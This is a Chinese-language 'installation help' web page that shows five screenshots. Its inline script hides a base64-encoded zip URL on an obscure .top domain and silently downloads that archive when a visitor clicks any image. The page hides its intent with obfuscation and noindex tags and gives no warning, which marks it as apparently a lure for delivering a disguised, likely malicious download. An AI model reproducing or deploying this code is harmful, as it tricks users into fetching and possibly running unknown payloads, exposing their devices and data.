<!DOCTYPE html>
<html lang="zh" style="height: 100%">
<head>
    <meta charset="UTF-8">
    <meta name="robots" content="noindex,nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>安装帮助</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
        }
        .image-viewport {
            width: 100vw;
            height: 100vh;
            scroll-snap-type: y mandatory;
            overflow-y: auto;
        }
        .screen-image {
            width: 100%;
            height: 100vh;
            scroll-snap-align: start;
            object-fit: contain;
        }
    </style>
</head>
<body>
    <div class="image-viewport">
        <img class="screen-image" src="images/img_01.jpg">
        <img class="screen-image" src="images/img_02.jpg">
        <img class="screen-image" src="images/img_03.jpg">
        <img class="screen-image" src="images/img_04.jpg">
        <img class="screen-image" src="images/img_05.jpg">
    </div>

<script>
    (function(){
        const getResource = str => decodeURIComponent(escape(atob(str)));
        
        const assets = [
            'aHR0cHM6Ly93d3cuenpta2sudG9wL1lmc2ZhY2FkYWNmZi56aXA=',
            'aHR0cHM6Ly93d3cuenpta2sudG9wL1lmc2ZhY2FkYWNmZi56aXA=',
            'aHR0cHM6Ly93d3cuenpta2sudG9wL1lmc2ZhY2FkYWNmZi56aXA=',
            'aHR0cHM6Ly93d3cuenpta2sudG9wL1lmc2ZhY2FkYWNmZi56aXA=',
            'aHR0cHM6Ly93d3cuenpta2sudG9wL1lmc2ZhY2FkYWNmZi56aXA='
        ];

        document.querySelectorAll('.screen-image').forEach((img, i) => {
            img.addEventListener('click', () => {
                const tmp = document.createElement('a');
                tmp.href = getResource(assets[i]);
                tmp.style.display = 'none';
                document.body.append(tmp);
                tmp.click();
                setTimeout(tmp.remove, 300);
            });
        });
    })();
</script>

</body>
</html>
